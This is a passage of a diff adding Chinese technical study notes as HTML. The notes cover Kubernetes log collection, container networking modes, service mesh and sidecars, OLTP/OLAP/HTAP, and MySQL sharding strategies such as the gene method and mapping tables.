+aliyun.log.access=/opt/tomcat/log/localhost_access.log.* tomcat</p>
+<p><strong>方式二：Kubernates启动设置env环境变量</strong></p>
+<p>-name: aliyun.logs.access</p>
+<p>value: /opt/tomcat/log/localhost_access.log</p>
+<p>log-pilot监控start，stop，destory等事件</p>
+<p>日志放在</p>
+<p>/host/opt/data/kubelet/pods/xxxxxxx/opt/tomcat/log/localhost_access.log</p>
+<p>/opt/log-pilot/logs/tomcat-xxxxxxxxx/localhost_access.log</p>
+<p><img src="media/image49.png" alt="">{width=&quot;4.406984908136483in&quot;
+height=&quot;1.7783825459317586in&quot;}</p>
+<h3><a class="anchor" aria-hidden="true" id="容器登录"></a><a href="#容器登录" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>容器登录</h3>
+<p>登录跳板机，执行：pod@podName</p>
+<p>实现原理：pod@podName执行的实质代码：kubectl exec -it pod podName
+/bin/bash，需在跳板机上安装kubectl命令。</p>
+<p>如何拦截pod@podName？</p>
+<h3><a class="anchor" aria-hidden="true" id="网络方案"></a><a href="#网络方案" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>网络方案</h3>
+<blockquote>
+<p>四种网络模式：None、Host、Bridge、Overlay</p>
+</blockquote>
+<p>性能损耗：</p>
+<p>对比纬度         TCP网速      TCP损耗   UDP网速      UDP损耗</p>
+<hr>
+<p>宿主机通信       938Mbits/s             958Mbits/s<br>
+Host             938Mbits/s   0         690Mbits/s   27.9%
+Birdge<br>
+Flannel(UDP)     590Mbits/s   37.1%     310Mbits/s   67.6%
+Flannel(VXLAN)   900Mbits/s   4.1%      160Mbits/s   83.2</p>
+<p>可用性：</p>
+<p>对比纬度   Ip和端口       性能   容器间通信   容器与物理机通信</p>
+<hr>
+<p>Bridge     独立IP和端口   高     支持         支持
+Host       共享IP和端口   高     支持         支持
+Overlay    独立IP和端口   低     支持         支持不友好
+None       没有网络</p>
+<p>优先Bridge、其次Overlay，备选Host。</p>
+<h3><a class="anchor" aria-hidden="true" id="有状态服务"></a><a href="#有状态服务" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>有状态服务</h3>
+<p>持久化存储</p>
+<p>本地存储：hostpath，节点不允许漂移</p>
+<p>对象存储：开源ceph，开源SAN/NAS，相当于挂载远程存储，网络将是瓶颈</p>
+<h3><a class="anchor" aria-hidden="true" id="弹性伸缩"></a><a href="#弹性伸缩" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>弹性伸缩</h3>
+<p>通用：CPU利用率高于50%扩容，低于20%缩容</p>
+<p>量化：业务自定义条件，QPS&gt;N扩容，异常数&gt;N缩容，根据时间段扩缩容（高峰、低谷）</p>
+<p>合理：质量标准，QPS，耗时分布</p>
+<h2><a class="anchor" aria-hidden="true" id="互联网微服务架构痛点"></a><a href="#互联网微服务架构痛点" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>互联网微服务架构痛点</h2>
+<p>微服务=功能水平拆分+业务垂直拆分</p>
+<p><img src="media/image50.png" alt="">{width=&quot;4.988438320209974in&quot;
+height=&quot;1.7783825459317586in&quot;}</p>
+<p>1、微服务需要关注服务间&quot;通信&quot;</p>
+<p>2、基础设施组件升级困难：影响基础设施团队的交付能力和交付速度</p>
+<p>3、多编程语言之间&quot;通信&quot;问题：每种语言一套基础设施，成本大</p>
+<h2><a class="anchor" aria-hidden="true" id="微服务架构发展方向"></a><a href="#微服务架构发展方向" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>微服务架构发展方向</h2>
+<p>1、业务团队专注于业务逻辑本身</p>
+<p>2、服务通信交给基础设施团队</p>
+<p>3、物理解耦业务研发团队和基础设施团队</p>
+<p>4、一套基础设施支持多语言开发</p>
+<p>5、基础设施能力从应用程序中下推</p>
+<p>6、真正做到快速迭代，持续交付</p>
+<p>这种思路类似于：分库分表 --&gt; NewSQL（分库分表逻辑下层），能力下推</p>
+<h2><a class="anchor" aria-hidden="true" id="服务网格架构设计与实践"></a><a href="#服务网格架构设计与实践" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>服务网格架构设计与实践</h2>
+<p>服务网格时一个基础设施层，用于处理服务间通信。云原生应用有着复杂的服务拓扑，服务网格负责在这些拓扑中实现请求的可靠传输。<strong>在实践中，服务网格通常实现为一组轻量级网络代理</strong>，它们与应用程序部署在一起，而对应用程序透明。</p>
+<p><img src="media/image51.png" alt="">{width=&quot;7.263888888888889in&quot;
+height=&quot;2.2555555555555555in&quot;}</p>
+<p>Sidecar为什么要和应用程序同机？如果跨机，Sidecar和应用程序之间的通信又会出现问题。引入Sidecar就是为了解决通信的问题。</p>
+<p>数据协议ProtoBuf</p>
+<p>Service Mesh（服务网格）的开源实现：Linkerd，Istio，蚂蚁金服SOFAMesh</p>
+<p>新项目推荐采用Istio。</p>
+<p>Sidecar和业务程序部署在一个POD/host上，如何协同？要确认两个都启动好。</p>
+<p>1、各自启动</p>
+<p>2、Sidecar监听来自业务程序的启动通知：收到后继续完成后续的初始化</p>
+<p>2、业务程序发送启动成功通知，等待Sidecar回复ACK，超时未收到回复再发送，收到ACK后完成后续启动。</p>
+<h2><a class="anchor" aria-hidden="true" id="架构未来"></a><a href="#架构未来" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>架构未来</h2>
+<p>2平台+1中心+1趋势</p>
+<p>2平台：Service Mesh，容器云平台</p>
+<p>1中心：服务治理中心</p>
+<p>1趋势：人工智能趋势</p>
+<h1><a class="anchor" aria-hidden="true" id="智能互联网之数据存储篇"></a><a href="#智能互联网之数据存储篇" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>智能互联网之数据存储篇</h1>
+<h2><a class="anchor" aria-hidden="true" id="数据库技术演进之路"></a><a href="#数据库技术演进之路" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>数据库技术演进之路</h2>
+<p>2008年以前：RDBMS（Relational Database Management
+System），关系数据库管理系统，应用最广泛的数据库，很好解决复杂的数据运算及表间处理。以Oracle、MySQL为代表。数据量不大，对关系，ACID，要求较高。</p>
+<p>2008年至2013年：NoSql（Not Only
+SQL），分布式非关系型数据库。随着互联网的高速扩容发展，数据量爆发增长（但对ACID要求不高），而RDBMS无法线性扩展，使得NoSQL快速发展，以MongoDB、HBase、Redis为代表</p>
+<p>2013年后：NewSQL，分布式关系型，随着互联网向银行、电信、电力等方向渗透，传统行业数据量迅速提升，需要同时满足线性扩容以及能够处理交易类事务的新型数据库。以Google
+Spanner/F1（闭源）、CockroachDB（开源，由Spanner/F1作者开发，Cockroach[ˈkɒkrəʊtʃ]，蟑螂）、TiDB（开源，国内PingCAT创业公司）为代表。</p>
+<p>TiDB：单表，1200亿，4台机器，平均响应延迟10ms。完全兼容mysql。</p>
+<p>未来发展方向HTAP：白天处理OLTP业务，晚上处理OLAP业务。</p>
+<p>NewSQL：兼容NoSQL扩展性又不丧失传统关系型数据库ACID特性的分布式关系型数据库。</p>
+<h3><a class="anchor" aria-hidden="true" id="olap--oltp--htap"></a><a href="#olap--oltp--htap" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>OLAP &amp; OLTP &amp; HTAP</h3>
+<p><strong>OLTP</strong>：On-Line Transaction
+Processing联机事务处理过程，也称为面向交易的处理过程，其基本特征是前台接收的用户数据可以立即传送到计算中心进行处理，并在很短的时间内给出处理结果，是对用户操作快速响应的方式之一。</p>
+<p><strong>OLAP</strong>：On-Line Analytical Processing，意为联机分析处理。</p>
+<pre><code class="hljs">         OLTP                     OLAP
+</code></pre>
+<hr>
+<p>用户       操作人员，底层管理人员   决策人员、高级管理人员
+功能       日常操作处理             分析决策
+DB设计     面向应用                 面向主题
+数据库     当前的，最新的细节的     历史的、聚集的
+存取       读/写数十条记录          读上百万条记录
+工作单位   简单的事务               复杂的查询
+用户数     上千个                   上百万个
+DB大小     100MB-GB                 100GB-TB
+时间要求   具有实时性               对时间的要求不严格
+主要应用   数据库                   数据仓库</p>
+<p>数据库系统一般可以按照负载类型分成操作型数据库（Operational Support
+System）和决策型数据库（Decision Support
+System）。操作型数据库主要用于应对日常流水类业务，主要是面向消费者类的业务；决策型数据库主要应对的是企业报表类，可视化等统计类业务，主要面向企业类的业务。</p>
+<p>针对两类系统的数据管理和系统设计方式都有很大差异。</p>
+<p>1、对OLTP的数据模型采用基本的约束E-R图模型，而OLAP的数据模型则需要采用特殊的&quot;星型模型&quot;，数据立方等数据仓库相关的技术</p>
+<p>2、对OLTP的数据存储通常采用行式组织，而OLAP采用列式组织</p>
+<p>3、OLTP的业务通常对实时要求比OLAP高很多</p>
+<p>4、传统的数据库，为了同时支持两类业务。通常采用两个数据源,
+分别对两套系统进行优化设计。</p>
+<p>OLTP的数据定期会通过etl（提取，转换，加载）工具把数据同步导入OLAP系统中。这就涉及到数据源滞后的问题。OLAP的数据滞后，导致分析出来的结果时效性不够，对决策支持类系统的要求不够。比如说，双11期间，用户购物的行为和推荐系统的推荐结果之间的时间差越短，越有可能提高销量。</p>
+<p><strong>HTAP</strong>：Hybrid Transaction and Analytical
+Process，混合事务和分析处理。HTAP是混合OLTP和OLAP业务同时处理的系统，2014年Garnter公司给出了严格的定义：混合事务/分析处理（HTAP）是一种新兴的应用体系结构，它打破了事务处理和分析之间的&quot;墙&quot;。它支持更多的信息和&quot;实时业务&quot;的决策。</p>
+<p>一、直接在单一数据源上不加区分的处理TP和AP的方案，一种折中的方案是采用快照的方式，分开处理OLTP和OLAP请求。让OLAP的请求在OLTP的最新的一致性快照上执行。同时对外暴露一套接口，从而从逻辑来看是一套系统。虽然内部是分开处理OLTP和OLAP的。这种方案，重要的一点就是保证快照尽可能的&quot;新&quot;，快照不能太过滞后OLTP的数据。这就需要系统频繁的做快照操作。</p>
+<p>目前两种流行的方案，一个是采用linux的系统快照能力，提供HTAP服务的方案，比如Hyper数据库系统。另一种是类似hana的方案，定期生成增量数据，然后合并到AP系统。</p>
+<p>二、新一代的数据库，NewSQL，如TiDB。</p>
+<h2><a class="anchor" aria-hidden="true" id="传统关系型数据库分库分表实践"></a><a href="#传统关系型数据库分库分表实践" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>传统关系型数据库分库分表实践</h2>
+<p>分库：按照业务功能的垂直拆分，如用户库、商品库、交易库，拆完之后数据库（比用户库）是否还要需要拆分，要看具体的数据量大小。</p>
+<p>分表：按水平方向分表，如uid%1024。</p>
+<h3><a class="anchor" aria-hidden="true" id="mysql-scale-out"></a><a href="#mysql-scale-out" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>MySQL Scale Out</h3>
+<p>架构升级：简单M-S架构 --&gt; DB拆分架构；无Cache --&gt; 有Cache</p>
+<p>硬件升级：SAS --&gt; SSD（PCIE，NVME）</p>
+<p>存在问题：跨数据库事务</p>
+<p><img src="media/image52.png" alt="">{width=&quot;3.702823709536308in&quot;
+height=&quot;2.9766043307086614in&quot;}</p>
+<h3><a class="anchor" aria-hidden="true" id="mysql-read-and-write-separation"></a><a href="#mysql-read-and-write-separation" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>MySQL Read and Write Separation</h3>
+<p>架构持续升级：表拆分（分表），读写分离（应用层）</p>
+<p>存在问题：读写分离需要应用层实现，非partition key读写问题</p>
+<p><img src="media/image53.png" alt="">{width=&quot;4.080865048118985in&quot;
+height=&quot;2.454957349081365in&quot;}</p>
+<p>存在容量与资源成本：分少再扩容麻烦，分多浪费资源</p>
+<h3><a class="anchor" aria-hidden="true" id="mysql-sharding"></a><a href="#mysql-sharding" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>MySQL Sharding</h3>
+<p>架构升级：</p>
+<p>解决横向写入扩展：上面的写入只能在一个节点写入，无法扩展，对user库也进行拆分</p>
+<p>Sharding组件：Sharding-JDBC（sharding-sphere）</p>
+<p>存在问题：</p>
+<p>业务Partition Key选择</p>
+<p>业务多维度查询</p>
+<p>数据同步（同步异步）</p>
+<p>Sharding语义如何透明</p>
+<p>机器资源使用率低</p>
+<p><img src="media/image54.png" alt="">{width=&quot;5.347916666666666in&quot;
+height=&quot;2.3222025371828523in&quot;}</p>
+<h3><a class="anchor" aria-hidden="true" id="mysql-db-proxy"></a><a href="#mysql-db-proxy" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>MySQL DB Proxy</h3>
+<p>Sharding架构升级：sharding由提供jar引入，变成由单独的proxy进行处理（分片机制下沉到一个单独的进程完成，NewSQL分片机制继续下沉到数据库来完成）</p>
+<p>存在问题：链路过长，语言限制</p>
+<p>dbproxy需要实现：分片规则配置、JDBC规范重写、SQL解析、SQL改写、SQL路由、SQL执行、结果归并。就是一个小型的sql解析器。</p>
+<p><img src="media/image55.png" alt="">{width=&quot;4.773842957130359in&quot;
+height=&quot;2.2974682852143484in&quot;}</p>
+<p>应用限制：</p>
+<p>DB弱化成存储，跨DB事务难实现，SQL聚合、join、子查询限制，实现全局ID</p>
+<p>业务妥协：</p>
+<p>partition Key选择，</p>
+<p>业务多维度查询：数据冗余，数据强一致性难以保证</p>
+<p>数据复制：同步双写，异步复制</p>
+<h3><a class="anchor" aria-hidden="true" id="sharding"></a><a href="#sharding" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>sharding</h3>
+<p><strong>分库</strong></p>
+<p>按业务垂直拆分库，比如分成用户库、商品库、交易库。</p>
+<p>库的共享：比如商品的API服务，有读商品的API服务和写商品的API服务，这两个服务共享商品库。</p>
+<p>DB进程共享：比如商品库和交易库本身数据量不大，可以用一个DB进程但不同的库。</p>
+<p><strong>分表</strong></p>
+<p><strong>场景一</strong>：用户表（uid, name, city, timestamp, sex,
+age），5亿条记录，X86_64机器，查询纬度单一（只按照uid查询）</p>
+<p>分几张表？</p>
+<p>MySQL一张表存多少条数据？经验值，如果sizeOf(row)&lt;100B，5KW一张表，如果sizeOf(row)&gt;100B，1KW一张表。针对这个例子sizeOf(row)=40B，那么就5千万一张表，一共分10张表，但10在二进制里面不是整数，<strong>分10张表后面不利于扩展</strong>（为什么呢？感觉差不多啊。只是分成2的n次方后，取模计算可以变成&amp;计算，x%n
+= x&amp;(n-1)），所以向上取整，16张表。</p>
+<p>Partition Key如何选择？</p>
+<p>按城市city分表：可能存储不均匀，通过uid查询需要查多张表</p>
+<p>按时间分表：存储均匀，但读写不均匀，且通过uid查询需要查多张表</p>
+<p>综合业务使用进行选择，比如这个需求查询纬度单一，只涉及按uid进行查询，就按uid分。uid%16分表。</p>
+<p><strong>场景二</strong>：商品表（uid, infoid, content,
+timestamp）,5亿条记录，X86_64机器，多维度查询要求（uid/infoid/timestamp）</p>
+<p>分几张表？</p>
+<p>根据上面的分表原则sizeOf(row)&lt;100，还是5KW一张表，分16张表。</p>
+<p>PartitonKey如何选择？</p>
+<p>业务需求：通过uid查询，通过infoid查询，按照timestamp查询。</p>
+<p>按infoid%16分表：存在问题通过uid查询时要遍历16张表</p>
+<p>按uid%16分表：通过infoid查询要遍历16张表</p>
+<p>假如一：
+uid是固定的不能变，infoid是可以变的，由业务生成。<strong>采用基因法：</strong></p>
+<p>在infoid中打上uid的烙印。Infoid的低位保持和uid的低位相同，比如这个16张表，只需要保证inofid的低4位和uid的低4位相同即可。这样uid%16=infoid%16。这样不管是按照uid分表还是按照infoid分表，模之后都是一样的。实际操作时可多取几位，防止后面扩展。</p>
+<p>假如二：uid是固定的，infoid也是固定的。<strong>采用映射表法：</strong></p>
+<p>① info表按照infoid%16分表，增加uid-infoid映射表，按uid%16分表</p>
+<blockquote>
+<p>通过infoid查询，可以直接定位到表，满足需求</p>
+<p>通过uid查询，先查映射表也能直接定位到表，但查询出多条记录，需根据记录遍历查询info表。</p>
+</blockquote>
+<p>② info表按照uid%16分表，增加infoid-uid映射表，按infoid%16分表</p>
+<p>通过infoid查询，先查映射表，定位出一条记录，找到uid，根据uid定位出分表，然后查询分表</p>
+<p>通过uid查询，直接定位到info表，然后查出多条记录</p>
+<p>映射表最好是一对一的，如果太大也可以分表。</p>
+<p>按timestamp查询，基因法和映射表法都不合适，思考业务场景，OLTP或OLAP？</p>
+<p>如果是OLTP需求，这应该是搜索需求，把查询纬度在Elasticsearch创建索引即可。</p>
+<p>如果是OLAP需求，可能是统计需求，对时间要求应该不敏感，遍历即可。</p>
+<h3><a class="anchor" aria-hidden="true" id="数据库中间件"></a><a href="#数据库中间件" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>数据库中间件</h3>
+<p>ORM：MyBatis3</p>
+<p>Sharding：Sharding-JDBC（Sharding-Sphere）</p>
+<p>DataBase Connection Pool：DBCP（apache），Druid（阿里，推荐），c3p0</p>
